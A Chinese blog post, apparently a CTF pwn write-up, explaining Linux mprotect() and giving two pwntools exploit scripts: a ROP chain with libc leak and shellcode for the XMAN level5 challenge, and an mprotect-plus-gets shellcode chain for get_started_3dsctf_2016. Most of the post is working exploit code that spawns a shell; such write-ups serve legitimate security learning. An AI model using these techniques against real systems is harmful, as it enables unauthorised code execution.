
---
title: xman的leve5另一种解法(mprotect)学习与利用
categories: [CTF]
tags: [pwn]

---

当时在xman听大佬将leve5利用时，很疑惑要调用mprotect，明明可以溢出执行`system('/bin/sh')`了. 直到我遇到些奇怪的静态编译题,我真香了故小记一下<!--more-->

## `mprotect()`函数

在Linux中，`mprotect()`函数可以用来修改一段指定内存区域的保护属性。mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。

使用方法：

```c
int mprotect(const void *start, size_t len, int prot);
```

常规使用：

```c
mprotect(addr, len, 7);
```

start表示一块代码段的起始位置。

len表示要修改长度，len的大小如果过小，libc会自动来补齐的。

port 表示权限 即使读（4）写（2）执行（1）

## leve5 exp

```python
from pwn import * 
from libcfind import *

local_mote=1
elf='./level3_x64'
e=ELF(elf)
#context.log_level = 'debug'
context.arch=e.arch
ip_port=['node4.buuoj.cn',26162]

debug=lambda : gdb.attach(p) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])

#debug()
rop = ROP(elf)

print(rop.dump())
p.recvline()
p.sendline(0x88*'1'+p64(0x0000000004006AA)+p64(0)+p64(1)+p64(e.got['write'])+p64(8)+p64(e.got['read'])+p64(1)+p64(0x000000000400690)+'s'*8*7+p64(e.sym['vulnerable_function']))

#addr=p.recvuntil('\x7f')[:-6].ljust(8,'\x00')
addr=u64(p.recv(7).ljust(8,'\x00'))
log.info(hex((addr)))
x=finder('read',addr)
"""
p.sendline(0x88*'1'+p64(0x00000000004006b3)+p64(x.dump('str_bin_sh'))+p64(x.dump('system')))
#addr=0x00600000
"""
rdx=0x00000000000cb1cd+x.libcbase
rdi=0x0000000000026796+x.libcbase
rsi=0x000000000002890f+x.libcbase


debug()
#p.sendline(0x88*'1'+p64(rdi)+p64(0x00600a00)+p64(rsi)+p64(0x100000)+p64(rdx)+p64(7)+p64(x.dump('mprotect'))+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))
p.sendline(0x88*'1'+p64(rdi)+p64(0)+p64(rsi)+p64(0x1000)+p64(rdx)+p64(7)+p64(x.dump('mmap'))+'1'*8)
#+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))

p.sendline(asm(shellcraft.sh()))

```

## 利用机会-get_started_3dsctf_2016

一般情况下mprotect的使用都用点画蛇添足，但是在一些静态编译的题目中就是很有用的。比如：get_started_3dsctf_2016

这道题是32位的，静态编译中ban了system，但是给mprotect了。由于没有开PIE，我们可以将可控的一段程序写入读写执行权限，然后写入后门，来得到shell



```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   2exp.py
@Time    :   2021/10/19 13:33:42
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=1
elf='./get_started_3dsctf_2016'
e=ELF(elf)
#context.log_level = 'debug'
context.arch=e.arch
ip_port=['node4.buuoj.cn',29847]

debug=lambda : gdb.attach(p) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])

gets=0x804f630
edi_ret=0x0805099d
addr=0x080ea900
eax_ret=0x080b91e6
ebx_ret=0x080481ad
edx_ret=0x0806fc0a
ret=0x08048196
int80=0x0806d7e5
ebx_edx_ret=0x0806fc09
write=0x806e1b0
#0x080557ab : mov dword ptr [edx], eax ; ret
#debug()
#0x080d8443 : xchg dword ptr [edx], ecx ; ret
#0x08048a26 : xchg eax, ecx ; ret 交换
#0x08048880 : mov ebx, dword ptr [esp] ; ret
ecx_write_edxaddr=0x080557ab
#p.sendline(0x38*'1'+p32(e.sym['malloc'])+p32(0x0809e4c5)+p32(0x100000)+p32(0)+p32(0)+p32(ebx_edx_ret)+p32(1)+p32(addr)+p32(ecx_write_edxaddr)+p32(e.sym['write'])+p32(e.sym['main'])+p32(1)+p32(addr)+p32(4))
#shelladdr=u32(p.recv(4))-8
#log.info(hex(shelladdr))
shelladdr=0x080ea000
ppp=0x0804f460
p.sendline(0x38*'1'+p32(e.sym['mprotect'])+p32(0x0809e4c5)+p32(shelladdr)+p32(0x200)+p32(7)+p32(e.sym['gets'])+p32(ret)+p32(shelladdr))
debug()
p.sendline(asm(shellcraft.sh()))
#p.sendline(asm(shellcraft.sh()))
p.interactive()
```

